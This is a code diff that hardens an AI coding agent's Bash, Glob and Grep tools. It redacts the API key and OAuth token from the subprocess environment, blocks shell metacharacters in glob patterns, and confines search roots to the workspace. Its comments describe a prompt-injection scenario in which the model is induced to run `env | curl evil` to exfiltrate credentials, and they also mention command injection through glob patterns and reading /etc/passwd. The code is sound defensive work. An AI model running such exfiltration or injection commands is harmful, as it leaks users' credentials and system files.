@@ -30,6 +30,36 @@ import { readFileTool, writeFileTool, editFileTool } from './built-in-tools/file
 const BASH_TIMEOUT_CEILING_MS = 600_000
 
 /**
+ * Env vars the model must NEVER see in a Bash subprocess. Centrally
+ * the BYOK API key — if a malicious prompt induces the model to run
+ * `env | curl evil`, the model exfiltrates the user's API credentials
+ * (caught by /agent-review on PR #4060 — see #4069). Plus chroxy's
+ * own per-session secrets that are scoped to the WS auth surface.
+ *
+ * Note: we do NOT redact every var that looks like a secret (e.g.
+ * GITHUB_TOKEN, AWS_*). The user might legitimately need those in
+ * their shell — they're the workspace owner. Only redact chroxy-
+ * specific credentials the model has no business reading.
+ */
+const SECRET_ENV_DENYLIST = new Set([
+  'ANTHROPIC_API_KEY',
+  'CLAUDE_CODE_OAUTH_TOKEN',
+])
+
+/**
+ * Build an env for the Bash/Glob/Grep subprocess that strips chroxy's
+ * own secrets. Returns a plain object — pass to executeBash's `env`.
+ */
+function buildSafeBashEnv() {
+  const out = {}
+  for (const [k, v] of Object.entries(process.env)) {
+    if (SECRET_ENV_DENYLIST.has(k)) continue
+    out[k] = v
+  }
+  return out
+}
+
+/**
  * Dispatch a single tool_use block.
  *
  * @param {object} args
@@ -60,9 +90,9 @@ export async function executeBuiltinTool({
       case 'Bash':
         return await runBash({ input, cwd, signal })
       case 'Glob':
-        return await runGlob({ input, cwd, signal })
+        return await runGlob({ input, cwd, cwdRealCache, cwdCacheTtl, signal })
       case 'Grep':
-        return await runGrep({ input, cwd, signal })
+        return await runGrep({ input, cwd, cwdRealCache, cwdCacheTtl, signal })
       default:
         return {
           content: `Unknown tool: ${toolName}. The claude-byok provider ships with: Read, Write, Edit, Bash, Glob, Grep. MCP and other tools land in follow-up issues.`,
@@ -154,7 +184,13 @@ async function runBash({ input, cwd, signal }) {
     ? Math.min(requested, BASH_TIMEOUT_CEILING_MS)
     : DEFAULT_BASH_TIMEOUT_MS
 
-  const result = await executeBash({ command, cwd, timeoutMs, signal })
+  const result = await executeBash({
+    command,
+    cwd,
+    timeoutMs,
+    signal,
+    env: buildSafeBashEnv(),
+  })
 
   // Build a single text payload — stdout, then stderr (if any), then a
   // status line. The model is the consumer here, so we err on the side
@@ -177,26 +213,40 @@ async function runBash({ input, cwd, signal }) {
   }
 }
 
-async function runGlob({ input, cwd, signal }) {
+// Characters in a glob pattern that allow shell-side command substitution
+// or piping. Glob patterns legitimately need *, ?, [], {}, /, ., alnum,
+// _, and -. They never need any of these. Refuse them to prevent the
+// "for f in <pattern>" interpolation from running an attacker payload
+// (caught by /agent-review on PR #4060 — see #4070).
+const GLOB_PATTERN_SHELL_METACHARS = /[$`;|&><()\\\n\r]/
+
+async function runGlob({ input, cwd, cwdRealCache, cwdCacheTtl, signal }) {
   const pattern = input?.pattern
   if (typeof pattern !== 'string' || pattern.length === 0) {
     return { content: 'EINVAL: pattern is required', isError: true }
   }
-  const root = typeof input?.path === 'string' && input.path.length > 0
-    ? input.path
-    : cwd
+  if (GLOB_PATTERN_SHELL_METACHARS.test(pattern)) {
+    return {
+      content: 'EINVAL: glob pattern contains shell-dangerous characters ($, `, ;, |, &, <, >, (, ), \\, newline)',
+      isError: true,
+    }
+  }
 
-  // Shell out with globstar so `**` works. Quoting the pattern via $'..'
-  // would defeat expansion — we want bash to expand it. The pattern is
-  // passed as a literal arg (with the safe-resolve below ensuring the
-  // root stays inside the workspace before bash even sees it).
-  //
-  // We do the safety check on the search ROOT, not on the pattern, since
-  // shell expansion is what produces the actual file paths.
-  await safeResolveOptional(root, cwd, signal)
+  // Realpath-validate the search ROOT against cwd. Pre-fix this was a
+  // weak "no ..." check that let absolute paths to /etc through.
+  const realRoot = await safeResolveRoot(input?.path, cwd, cwdRealCache, cwdCacheTtl)
 
-  const cmd = `shopt -s globstar nullglob; cd ${shellQuote(root)} && for f in ${pattern}; do printf '%s\\n' "$f"; done`
-  const result = await executeBash({ command: cmd, cwd: root, signal, timeoutMs: 30_000 })
+  // Shell expansion of `for f in <pattern>` is what produces the file
+  // paths. Pattern is now whitelist-validated above, so interpolation
+  // is safe.
+  const cmd = `shopt -s globstar nullglob; cd ${shellQuote(realRoot)} && for f in ${pattern}; do printf '%s\\n' "$f"; done`
+  const result = await executeBash({
+    command: cmd,
+    cwd: realRoot,
+    signal,
+    timeoutMs: 30_000,
+    env: buildSafeBashEnv(),
+  })
   if (result.exitCode !== 0 && !result.stdout) {
     return { content: `Glob failed: ${result.stderr || `exit ${result.exitCode}`}`, isError: true }
   }
@@ -205,15 +255,12 @@ async function runGlob({ input, cwd, signal }) {
   return { content: files.join('\n'), isError: false }
 }
 
-async function runGrep({ input, cwd, signal }) {
+async function runGrep({ input, cwd, cwdRealCache, cwdCacheTtl, signal }) {
   const pattern = input?.pattern
   if (typeof pattern !== 'string' || pattern.length === 0) {
     return { content: 'EINVAL: pattern is required', isError: true }
   }
-  const root = typeof input?.path === 'string' && input.path.length > 0
-    ? input.path
-    : cwd
-  await safeResolveOptional(root, cwd, signal)
+  const realRoot = await safeResolveRoot(input?.path, cwd, cwdRealCache, cwdCacheTtl)
 
   // Prefer ripgrep; fall back to grep. Both honor -i and -n.
   const ci = input?.['-i'] === true ? '-i' : ''
@@ -223,11 +270,17 @@ async function runGrep({ input, cwd, signal }) {
 
   // Try rg first. If it's not installed (command not found, exit 127),
   // retry with grep -r. Either way the output is `path:lineno:content`.
-  const tryRg = `command -v rg >/dev/null 2>&1 && rg ${ci} ${ln} --no-heading${globArg} ${shellQuote(pattern)} ${shellQuote(root)}`
-  const tryGrep = `grep -r ${ci} ${ln} ${shellQuote(pattern)} ${shellQuote(root)}`
+  const tryRg = `command -v rg >/dev/null 2>&1 && rg ${ci} ${ln} --no-heading${globArg} ${shellQuote(pattern)} ${shellQuote(realRoot)}`
+  const tryGrep = `grep -r ${ci} ${ln} ${shellQuote(pattern)} ${shellQuote(realRoot)}`
   const cmd = `(${tryRg}) || (${tryGrep})`
 
-  const result = await executeBash({ command: cmd, cwd: root, signal, timeoutMs: 60_000 })
+  const result = await executeBash({
+    command: cmd,
+    cwd: realRoot,
+    signal,
+    timeoutMs: 60_000,
+    env: buildSafeBashEnv(),
+  })
   // grep/rg both return exit 1 on "no matches" — that's not an error
   // for our purposes. Only exit 2+ or stderr-without-stdout signals an
   // actual failure.
@@ -238,15 +291,34 @@ async function runGrep({ input, cwd, signal }) {
   return { content: result.stdout, isError: false }
 }
 
-async function safeResolveOptional(p, _cwd, _signal) {
-  if (typeof p !== 'string' || p.length === 0) return
-  // Light path safety on the root — we don't realpath here because the
-  // shell expansion happens inside the spawned bash anyway, but we
-  // reject obvious escapes (.., ~ unexpanded).
-  const trimmed = p.trim()
-  if (trimmed.startsWith('..') || trimmed.includes('/..')) {
-    throw Object.assign(new Error(`path may not contain ..`), { code: 'EACCES' })
+/**
+ * Validate that an optional `path` argument (for Glob/Grep search roots)
+ * is inside the workspace cwd. Defaults to cwd when unset/empty. Returns
+ * the realpath so the caller can pass it to bash safely (the spawned
+ * shell uses the realpath, not the original symlinked alias).
+ *
+ * SECURITY: an earlier draft of this function only rejected literal `..`
+ * sequences, which let `Glob { path: '/etc' }` and `Grep { path: '/etc' }`
+ * search the entire filesystem and return /etc/passwd etc. Caught by
+ * `/agent-review` on PR #4060 — see #4071. Now realpath-validates the
+ * path through the same machinery the Read/Write/Edit tools use.
+ */
+async function safeResolveRoot(p, cwd, cwdRealCache, cwdCacheTtl) {
+  if (typeof p !== 'string' || p.length === 0) return cwd
+  const absolute = isAbsolute(p) ? p : resolve(cwd, p)
+  const { valid, realPath, cwdReal } = await validatePathWithinCwd(
+    absolute,
+    cwd,
+    cwdRealCache,
+    cwdCacheTtl,
+  )
+  if (!valid) {
+    throw Object.assign(
+      new Error(`path outside workspace: ${p} resolves to ${realPath}, expected under ${cwdReal}`),
+      { code: 'EACCES' },
+    )
   }
+  return realPath
 }
 
 /**
